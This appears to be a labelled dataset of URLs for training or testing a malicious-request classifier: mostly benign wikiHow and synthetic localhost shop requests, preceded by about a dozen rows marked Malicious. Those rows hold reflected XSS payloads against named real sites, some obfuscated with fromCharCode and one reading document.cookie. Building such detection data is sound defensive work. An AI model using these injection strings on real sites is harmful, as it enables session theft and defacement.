http://www.nibud.nl/consumenten/index.php?zoekoptrefwoord=%22%3e%3cscript%3ealert%28123%29%3c%2fscri<br>pt%3e&amp;zoekopcategorie=consumenten&amp;action=zoekoptrefwoord&amp;subject=zoeken+op+de+website,Malicious
http://www.siemens.com.ar/run.asp?opcion=2504==&quot;&gt;&lt;script&gt;alert('www.nullcode.com.ar - hunting<br>security bugs!')&lt;/script&gt;,Malicious
http://jaiku.com/login?redirect_to=/login/forgot/%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74<br>%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%<br>37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%3<br>9%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
"http://tribreaker.tr.funpic.de/datei.html?suche=%22%3e%3cscript%3ealert(string.fromcharcode(107,%207<br>3,%20110,%2071,%20111,%2070,%2099,%2072,%2097,%2079,%20115,%2032,%20105,%2083,%2032,%20100,%2065,%20<br>32,%2098,%20101,%2083,%20116,%2032,%2070,%20117,%2099,%2075,%2032,%2084,%20104,%20101,%2032,%2082,%2<br>0101,%20115,%2084,%2033,%2033,%2033));%3c/script%3e%3c!--%22%3e%3cscript%3ealert(string.fromcharcode<br>(107,%2073,%20110,%2071,%20111,%2070,%2099,%2072,%2097,%2079,%20115,%2032,%20105,%2083,%2032,%20100,<br>%2065,%2032,%2098,%20101,%2083,%20116,%2032,%2070,%20117,%2099,%2075,%2032,%2084,%20104,%20101,%2032<br>,%2082,%20101,%20115,%2084,%2033,%2033,%2033));%3c/script%3e%3c!--",Malicious
http://www.champagnole-zoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious
http://members.driverguide.com/doc.php?page=%22%3e%3chtml%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
"http://host.hackers-in-action.de//viewer.php?id=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(<br>88,83,83))&lt;/script&gt;",Malicious
http://www.funnygames.nl/zoeken/?s=%22%3e%3cscript%3ealert%28/killer-tr/%29%3c/script%3e,Malicious
http://ghrc.nsstc.nasa.gov/hydro/search.pl?hydro&pr=<script>alert('cyberbellona')</script>,Malicious
http://humperstudios.powernapkin.net/shows/play.php?t=movieoftheweek&amp;s=%3c/script%3e%3ciframe%20src=<br>javascript:alert(123)%3e,Malicious
http://investors.cray.com/phoenix.zhtml?c=98390&amp;p=irol-newsarticle&amp;id=1136684&amp;highlight=%22%3etestic<br>les%3c/a%3etest%3cmarquee%3epappy was here%3c/marquee%3e,Malicious
http://radio-fsn-versand.de/s2dlogin.php?basket_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;redirec<br>t=7068702e70696873643273,Malicious
http://www.wikihow.com/use-the-general-file-converter-in-pd-howler&t=1396630457638&n=5458299&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6047&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tania&password=32x4i17uib1e&nombre=donato&apellidos=dold%e1n+yebra&email=sanson%40espanolynegocios.lu&dni=48258022c&direccion=c%2f+trocadero+s%2fn+8%3ff&ciudad=rus&cp=40391&provincia=guadalajara&ntc=9097917444528298&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=salimi&password=mu-cronato&nombre=danilo&apellidos=gal%ed&email=vallin%40juegosgratisinternet.um&dni=93029703q&direccion=c%2f+de+fonseca%2c+2%2c+11%3fh&ciudad=rozas+de+madrid%2c+las&cp=19119&provincia=badajoz&ntc=5718355774988214&b1=registrar,Benign
http://www.wikihow.com/make-warm-milk-with-a-hint-of-chocolate&t=1396545607931&n=1650132&k=mainentity,Benign
http://www.wikihow.com/repair-slab-foundation-cracks&t=1396562442718&n=2548140&k=mainentity,Benign
http://www.wikihow.com/dress-if-you%27re-going-shopping&t=1396517970206&n=353118&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=100&cantidad=25&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/cope-with-canine-epilepsy&t=1396527095372&n=822188&k=mainentity,Benign
http://www.wikihow.com/avoid-embarrassment-whilst-visiting-your-boyfriend%27s-parents&t=1396571085055&n=2974497&k=mainentity,Benign
http://www.wikihow.com/make-an-octopus-costume&t=1396528323262&n=874561&k=mainentity,Benign
http://www.wikihow.com/pray-the-joyful-mysteries-of-the-rosary&t=1396569675273&n=2914897&k=mainentity,Benign
http://www.wikihow.com/develop-financial-responsibility&t=1396612950989&n=4799415&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=100&cantidad=14&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/build-a-bond-with-your-dog&t=1396516644357&n=265008&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ho-mu&pwd=74e43a&remember=on&b1=entrar,Benign
http://www.wikihow.com/kickup-on-a-kick-scooter&t=1396531414895&n=1019565&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gast&pwd=abotinad*o&remember=on&b1=entrar,Benign
http://www.wikihow.com/set-up-a-red-lion-pax2d&t=1396532028697&n=1047182&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=paris&password=linf%e1tico&nombre=charlotte&apellidos=vic%e8n+revuelta&email=rendra%40imarbella.mq&dni=16847863h&direccion=c%2f+fernando+villaamil%2c+38+2b&ciudad=biel&cp=01474&provincia=guadalajara&ntc=2824561202622015&b1=registrar,Benign
http://www.wikihow.com/make-a-duck-costume&t=1396528303075&n=872749&k=mainentity,Benign
http://www.wikihow.com/360-in-modern-warfare-2&t=1396649248884&n=5995671&k=mainentity,Benign
http://www.wikihow.com/choose-a-drag-queen-name&t=1396571877089&n=3005125&k=mainentity,Benign
http://www.wikihow.com/customize-your-twitter-colors&t=1396629877503&n=5437225&k=mainentity,Benign
http://www.wikihow.com/start-to-code&t=1396534064990&n=1141661&k=mainentity,Benign
http://www.wikihow.com/gain-access-into-windows-xp&t=1396610942627&n=4736510&k=mainentity,Benign
http://www.wikihow.com/take-control-of-your-debts&t=1396612827162&n=4795270&k=mainentity,Benign
http://www.wikihow.com/make-an-hawaiian-sherbet-float&t=1396545638032&n=1652152&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5709&b1=confirmar,Benign
http://www.wikihow.com/calculate-blow-dryer-amps&t=1396562551327&n=2556216&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2433&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2373&b1=confirmar,Benign
http://www.wikihow.com/break-the-mt.-shiveer-ice-on-animal-jam&t=1396648244216&n=5957775&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=burcew&pwd=luminiscencia&remember=off&b1=entrar,Benign
http://www.wikihow.com/back-up-a-mysql-database-to-dropbox-using-backup-box&t=1396533914759&n=1134677&k=mainentity,Benign
http://www.wikihow.com/dress-like-ryan-gosling-in-drive&t=1396527569356&n=838289&k=mainentity,Benign
http://www.wikihow.com/avoid-fearmonger-tactics&t=1396516095436&n=238142&k=mainentity,Benign
http://www.wikihow.com/view-other-user%27s-lists-on-yelp&t=1396629639296&n=5427629&k=mainentity,Benign
http://www.wikihow.com/release-daily-stress&t=1396594485241&n=3938345&k=mainentity,Benign
http://www.wikihow.com/make-butterflied-danggit&t=1396547305113&n=1761548&k=mainentity,Benign
http://www.wikihow.com/use-a-grid-in-pd-howler&t=1396630458517&n=5458319&k=mainentity,Benign
http://www.wikihow.com/apply-mermaid-inspired-eye-makeup&t=1396593661073&n=3900532&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=aydin&pwd=l0c-e2870d0&remember=on&b1=entrar,Benign
http://www.wikihow.com/become-a-warrior-cat&t=1396633395268&n=5527037&k=mainentity,Benign
http://www.wikihow.com/create-a-green-video-invitation&t=1396547004073&n=1736260&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=avtar&password=abarcar&nombre=presentaci%f3n&apellidos=veliz+gaya&email=zimmer.alerme%40estoespresto.pt&dni=05398730d&direccion=calle+el+tulipan%2c+21%2c+&ciudad=otos&cp=28511&provincia=la+rioja&ntc=7691856591463732&b1=registrar,Benign
http://www.wikihow.com/cope-with-griefing-on-a-minecraft-tekkit-server&t=1396648447769&n=5966403&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=filippi&password=desin%3fteresado&nombre=gayane&apellidos=vilageli+bonet&email=coggio_klemperer%40cortinasartesol.ro&dni=86367581m&direccion=pasaje+ojeda+s%2fn+7%3fe&ciudad=santiago+de+compostela&cp=23420&provincia=pontevedra&ntc=3608872208421678&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6241&b1=pasar+por+caja,Benign
http://www.wikihow.com/migrate-quickly-from-oscommerce-to-opencart-using-cart2cart&t=1396533878015&n=1133397&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=abdallah6&password=08li6a2o&nombre=rodopiano&apellidos=rib%f3+mateos&email=tsvetarski%40hiperespa%f1a.hk&dni=13190545e&direccion=c%2f+solana%2c+10%2c+7%3fh&ciudad=fornalutx&cp=45571&provincia=zamora&ntc=2101063829974368&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=76&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/decorate-a-big-wall&t=1396562204132&n=2534028&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nickey&pwd=baladrero&remember=off&b1=entrar,Benign
http://www.wikihow.com/choose-a-healthy-puppy&t=1396516740215&n=268768&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=soyuer&pwd=meli%e1cea&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mott&pwd=capiz8na&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=anne-cor0&pwd=remanecer&remember=off&b1=entrar,Benign
http://www.wikihow.com/survive-working-at-summer-camp&t=1396631206426&n=5476504&k=mainentity,Benign
http://www.wikihow.com/choose-the-best-party-favors-for-your-child%27s-birthday-party&t=1396547051595&n=1738672&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ly&password=es0099era&nombre=madelaine&apellidos=cusquisiban+ocifuente&email=orman.albertazzi%40raullazaro.is&dni=62349975b&direccion=calle+porta+de+la+morera+78+&ciudad=huerta+de+la+obispal%eda&cp=26211&provincia=la+rioja&ntc=2661491792098457&b1=registrar,Benign
http://www.wikihow.com/finance-portable-hot-tubs&t=1396563982941&n=2645434&k=mainentity,Benign
http://www.wikihow.com/make-a-2-minute-snack&t=1396546676770&n=1718812&k=mainentity,Benign
http://www.wikihow.com/prevent-sibling-rivalry&t=1396609480538&n=4683058&k=mainentity,Benign
http://www.wikihow.com/explain-why-christians-don%27t-need-to-be-baptized-in-water&t=1396570319779&n=2942661&k=mainentity,Benign
http://www.wikihow.com/make-a-puppy-sleep-in-a-crate&t=1396516763194&n=269788&k=mainentity,Benign
http://www.wikihow.com/make-party-beverages-for-minors&t=1396545836509&n=1664944&k=mainentity,Benign
http://www.wikihow.com/get-electricity-connected-to-your-property-in-portugal&t=1396562572188&n=2557076&k=mainentity,Benign
http://www.wikihow.com/buy-office-furniture-online&t=1396562709514&n=2567436&k=mainentity,Benign
http://www.wikihow.com/design-an-invitation-using-canva&t=1396547007395&n=1736428&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mahoney-7&password=78co2%2457ad1&nombre=akemi&apellidos=osuna+cuellar&email=cejvan%40tagarautomation.name&dni=24972017c&direccion=ronda+capuchinos+112%2c+&ciudad=ledigos&cp=33197&provincia=teruel&ntc=1636404062174246&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2724&b1=confirmar,Benign
http://www.wikihow.com/defrag-hard-drive-to-improve-a-computer%27s-performanc&t=1396630475508&n=5459027&k=mainentity,Benign
http://www.wikihow.com/annoy-people-that-think-they-are-your-friend&t=1396571697905&n=2997893&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6399&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=smeenk&pwd=casquiblanda&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=logue&password=dogal&nombre=genera&apellidos=abrisqueta+gabarros&email=venture%40ajuntamentbcn20.cr&dni=99012513c&direccion=calle+josep+anselm+clave+44%2c+&ciudad=verges&cp=03769&provincia=barcelona&ntc=0569472888746969&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=achkar&pwd=p2rtinente*ment6&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=91&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/shine-with-positive-energy&t=1396569956236&n=2927753&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=70&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/get-sc-and-fame-on-vip(100sc%27s-50-fame)&t=1396648373477&n=5962739&k=mainentity,Benign
http://www.wikihow.com/create-overnight-beach-waves&t=1396593104923&n=3868075&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=moyna&password=en77925r&nombre=giezi&apellidos=aill%f3n+paniagua&email=obrien%40gesmahernan.vu&dni=89454371b&direccion=calle+mata+92%2c+4f&ciudad=cabezuela+del+valle&cp=14720&provincia=%c1lava&ntc=5697798344516062&b1=registrar,Benign
http://www.wikihow.com/keep-food-in-the-freezer-from-crystallizing&t=1396517610691&n=327843&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rog&password=ramial&nombre=leka&apellidos=grimaldi+escriva&email=diarra%40isbn.com.ie&dni=28681618c&direccion=periodista+gonzalez+hoyos%2c+174%2c+&ciudad=priego+de+c%f3rdoba&cp=30412&provincia=ciudad+real&ntc=7712379186246495&b1=registrar,Benign
http://www.wikihow.com/have-a-confucian-wedding-ceremony&t=1396570201931&n=2937277&k=mainentity,Benign
http://www.wikihow.com/decorate-your-room-when-you-have-very-little-to-decorate-with&t=1396562150850&n=2530608&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7101&b1=confirmar,Benign
http://www.wikihow.com/switch-from-virtuemart-to-prestashop-using-cart2cart&t=1396533892831&n=1133921&k=mainentity,Benign
http://www.wikihow.com/cope-with-being-thought-of-as-irritating-online&t=1396533006763&n=1093072&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ebara1&password=8%f36t3lo&nombre=acinta&apellidos=sanchis&email=labry%40buscadordevideos.ly&dni=48080292b&direccion=julian+gayarre%2c+16+11%3fg&ciudad=ventrosa&cp=16317&provincia=barcelona&ntc=3587302530993786&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=emmey&password=ru0ian5e&nombre=leig&apellidos=lest%f3n+petitbernard&email=hammoud-cecil%40softwaremasservicio.to&dni=59657097l&direccion=pl.+chapina+67+4-h&ciudad=coma+i+la+pedra%2c+la&cp=34410&provincia=asturias&ntc=2394971061367749&b1=registrar,Benign
http://www.wikihow.com/make-sans-souci-punch&t=1396545685281&n=1655592&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=haghighi&pwd=b43m5rio&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-a-non-alcoholic-alabama-slammer&t=1396545806478&n=1662816&k=mainentity,Benign
http://www.wikihow.com/stop-dog-fights&t=1396516716893&n=267800&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=isobel&password=principio&nombre=vito&apellidos=caridad+huix&email=diaz%40sehimaco.tl&dni=29524752c&direccion=c%2f+nuncio+viejo+133+9e&ciudad=caudiel&cp=15886&provincia=baleares+%28illes%29&ntc=7738743589442377&b1=registrar,Benign
http://www.wikihow.com/brighten-dark-lips-instantly&t=1396593734749&n=3904432&k=mainentity,Benign
http://www.wikihow.com/construct-a-basic-arp-packet-using-colasoft-packet-builder-for-windows-7&t=1396534066681&n=1141793&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7108&b1=confirmar,Benign
http://www.wikihow.com/make-jumukbab&t=1396613925844&n=4834412&k=mainentity,Benign
http://www.wikihow.com/explore-your-country&t=1396630648024&n=5461998&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7712&b1=confirmar,Benign
http://www.wikihow.com/act-like-an-alien&t=1396528200624&n=867433&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chancey&password=cl%edba22&nombre=em%e9rito&apellidos=lentisco+moyo&email=maunder%40eyewear.nom.coop&dni=03995650k&direccion=c%2f+vives+de+ca%f1amas+52+1%3fg&ciudad=garrucha&cp=41360&provincia=navarra&ntc=6577380187990722&b1=registrar,Benign
http://www.wikihow.com/make-a-chicken-and-rice-casserole&t=1396610349709&n=4711082&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ottowa5&password=08n0u1vi0al&nombre=nieves&apellidos=vedia+sagasti&email=brega%40aspirantes.bv&dni=44866423r&direccion=c%2f+benedictinas+de+san+jose%2c+20+10e&ciudad=cill%e1n&cp=08291&provincia=burgos&ntc=2426074122150919&b1=registrar,Benign
http://www.wikihow.com/resist-bossing-a-slow-learner&t=1396632904375&n=5513320&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=boroski&pwd=7id1784a11&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-%22mountain-bawlz%22&t=1396545701418&n=1656436&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mclellan&pwd=6i07r0i6a&remember=off&b1=entrar,Benign
http://www.wikihow.com/prepare-for-a-bumpy-and-speedy-roller-coaster&t=1396527925026&n=853569&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bryan&pwd=catedr%e1tica&remember=off&b1=entrar,Benign
http://www.wikihow.com/get-a-youthful-glow-with-bronzer&t=1396593886370&n=3912668&k=mainentity,Benign
http://www.wikihow.com/use-the-couchsurfing-android-app&t=1396629471311&n=5419985&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=4&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/teach-children-to-write-a-book&t=1396609502255&n=4683525&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7581&b1=confirmar,Benign
http://www.wikihow.com/ensure-safety-with-regular-wheel-alignment&t=1396531464076&n=1022029&k=mainentity,Benign
http://www.wikihow.com/choose-the-right-appliance-repair-company&t=1396562292639&n=2538668&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=howes&password=va7e9ianato&nombre=navila&apellidos=figueres+kercad%f3&email=merot%40candidaturaolle-futuronotarial.ke&dni=49766583b&direccion=porta+de+la+vega+121+&ciudad=jerez+del+marquesado&cp=05634&provincia=alicante&ntc=4822962133866986&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=spyros&password=cayar%ed&nombre=frida&apellidos=guinart+giuliani&email=borkan%40discon.gw&dni=31648344e&direccion=c%2f+la+atalaya%2c+s%2fn%2c+&ciudad=segura+de+la+sierra&cp=50109&provincia=toledo&ntc=7581470621974677&b1=registrar,Benign
http://www.wikihow.com/save-time-in-the-library&t=1396527813146&n=848193&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9706&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wiesje&password=cu%2bnera&nombre=leila&apellidos=balsas+varillas&email=gundel%40tvup.be&dni=39582069n&direccion=pasaje+seda+48+1%3fb&ciudad=bahab%f3n&cp=50340&provincia=zaragoza&ntc=5952804750177052&b1=registrar,Benign
http://www.wikihow.com/be-a-threat-with-battle-rifles-and-carbines-in-halo-2&t=1396649484462&n=6005398&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2249&b1=confirmar,Benign
http://www.wikihow.com/expect-beyond-hope&t=1396569651196&n=2913985&k=mainentity,Benign
http://www.wikihow.com/make-perfect-pakora&t=1396515665994&n=205617&k=mainentity,Benign
http://www.wikihow.com/attract-lots-of-people-as-a-kid-or-teen&t=1396571444598&n=2988421&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=furnas&password=gab.ato&nombre=amado&apellidos=sequeiro+pratginesta&email=gutschwager.macdermott%40sitcpla.vc&dni=33969414r&direccion=c%2f+morejon%2c+67+&ciudad=ajangiz&cp=44477&provincia=%c1vila&ntc=2456435207719621&b1=registrar,Benign
http://www.wikihow.com/get-a-girlfriend-on-movie-star-planet-for-girls&t=1396648369244&n=5962579&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=98&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/earn-more-fame-quickly-on-moviestarplanet&t=1396648367573&n=5962523&k=mainentity,Benign
http://www.wikihow.com/maximize-the-charge-of-an-apple-battery&t=1396532686519&n=1075352&k=mainentity,Benign
http://www.wikihow.com/plan-a-trip-using-your-car-navigation-system&t=1396533401034&n=1111521&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=popowycz&password=pirofil5c9o&nombre=maycol&apellidos=ceballos&email=albany-pemberton%40citiway.ai&dni=17217664w&direccion=c%2f+arado+123+10%3fh&ciudad=villar+del+infantado&cp=09462&provincia=palencia&ntc=6540574928615130&b1=registrar,Benign
http://www.wikihow.com/buy-los-angeles-lakers-tickets&t=1396527429691&n=833958&k=mainentity,Benign
http://www.wikihow.com/be-the-only-girl-around-a-guy%27s-friends&t=1396611959834&n=4769842&k=mainentity,Benign
http://www.wikihow.com/make-grilled-chilli-baby-spare-ribs&t=1396547207416&n=1750748&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=medel8&password=4u36a5&nombre=yodalia&apellidos=vich+bov%e9&email=rhett%40guiapolicial.yu&dni=25301830j&direccion=c%2f+parque+residencial+ruben+dario%2c+50+&ciudad=valfarta&cp=46669&provincia=palencia&ntc=0649770357645683&b1=registrar,Benign
http://www.wikihow.com/get-your-money-back-from-an-auto-transport-company&t=1396613185541&n=4808971&k=mainentity,Benign
http://www.wikihow.com/make-cherry-candy-in-harvest-moon:-animal-parade&t=1396649562100&n=6008178&k=mainentity,Benign
http://www.wikihow.com/change-how-your-friends-think-about-you&t=1396571314849&n=2983769&k=mainentity,Benign
http://www.wikihow.com/make-chocolate-caramel-walnuts-(uncooked-fondant)&t=1396595116665&n=3975343&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2421&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6267&b1=confirmar,Benign
http://www.wikihow.com/make-a-counter-strike:-source-dedicated-server&t=1396648526772&n=5970147&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=clentice3&password=cal5v9r7a0&nombre=leonarda&apellidos=armengol+porto&email=beck-gaden%40asociaciondearquitectoslatinoamericanos.ch&dni=76844031l&direccion=postigo+de+la+cuna%2c+159+&ciudad=rebollosa+de+jadraque&cp=34257&provincia=zaragoza&ntc=6574384578961467&b1=registrar,Benign
http://www.wikihow.com/bond-with-friends&t=1396571312240&n=2983661&k=mainentity,Benign
http://www.wikihow.com/earn-starz-in-fantage&t=1396648108250&n=5951659&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=imi&pwd=reeducaci%f3n&remember=on&b1=entrar,Benign
http://www.wikihow.com/use-dealtherapy.com-to-find-coupons&t=1396613105189&n=4805731&k=mainentity,Benign
"http://www.wikihow.com/get-as-many-lifetime-points-as-you-want-in-sims-1,-2,-3-and-4&t=1396648708005&n=5978891&k=mainentity",Benign
http://www.wikihow.com/popularize-your-webshow&t=1396630164304&n=5448929&k=mainentity,Benign
http://www.wikihow.com/create-a-wearable-cat-costume&t=1396528290042&n=871745&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=948&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9492&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-and-enjoy-a-shirley-temple&t=1396545825806&n=1664128&k=mainentity,Benign
http://www.wikihow.com/have-a-longer-lasting-dell-latitude-d630-laptop-battery&t=1396532678197&n=1075060&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9517&b1=pasar+por+caja,Benign
http://www.wikihow.com/be-someone-everyone-likes&t=1396571460272&n=2989001&k=mainentity,Benign
http://www.wikihow.com/make-a-stove-out-of-two-disposable-ashtray&t=1396562315013&n=2540404&k=mainentity,Benign
http://www.wikihow.com/buy-a-studio-mic&t=1396632824114&n=5510564&k=mainentity,Benign
http://www.wikihow.com/hang-exterior-window-shutters&t=1396562496206&n=2552124&k=mainentity,Benign
http://www.wikihow.com/get-starpoints-in-stardoll&t=1396647804544&n=5937691&k=mainentity,Benign
http://www.wikihow.com/make-a-veggie-face-mask&t=1396593446785&n=3888284&k=mainentity,Benign
http://www.wikihow.com/play-toypetz-club&t=1396528261643&n=870425&k=mainentity,Benign
http://www.wikihow.com/undo-a-twitter-worm&t=1396631754245&n=5488864&k=mainentity,Benign
http://www.wikihow.com/make-confetti-v-darts&t=1396546597464&n=1714932&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=39&cantidad=39&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/unjam-a-vcr&t=1396532956933&n=1090180&k=mainentity,Benign
http://www.wikihow.com/deter-skunks&t=1396563192609&n=2597488&k=mainentity,Benign
http://www.wikihow.com/perform-wudhuu&t=1396570093456&n=2932861&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=spinks&password=prestamero&nombre=kenyi&apellidos=bonfill+refoyo&email=karyo%40esposo.com.ax&dni=42897126x&direccion=concordia%2c+58%2c+6-h&ciudad=garganta+la+olla&cp=32310&provincia=albacete&ntc=0299123316698718&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5280&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marjan&password=%e1bsi.da&nombre=esdras&apellidos=korta&email=trestini%40hangarcentrodelautomovil.kp&dni=93504516v&direccion=calle+vista+alegre+132+&ciudad=fuente+de+cantos&cp=28473&provincia=segovia&ntc=2804622035636045&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=drynan&password=rodadura&nombre=amaury&apellidos=barnera+portilla&email=ludlam.conroy%40lalectura.ag&dni=08908566e&direccion=c%2f+sant+vicent+56+12%3fe&ciudad=villarta+de+san+juan&cp=05165&provincia=navarra&ntc=4525434805860030&b1=registrar,Benign
http://www.wikihow.com/disagree-with-your-priest&t=1396569992971&n=2929249&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=15&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=85&cantidad=3&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=crawley&password=hojarasca&nombre=abigail&apellidos=mart%ed+de+uralde&email=medboe-krasojevic%40paseotuperro.bu&dni=87843127d&direccion=c%2f+profesor+antonio+de+hoyos+61%2c+4-d&ciudad=vilanova+de+la+barca&cp=29195&provincia=huelva&ntc=4429008653439861&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=abacus6&password=acusatoria&nombre=yanela&apellidos=barneda+kanagusico&email=breslin%40lasexta-f1.hr&dni=15843250e&direccion=camino+sabene%2c+155+1%3ff&ciudad=azu%e9bar&cp=31751&provincia=cantabria&ntc=6021042676836529&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=6&b1=a%f1adir+al+carrito,Benign
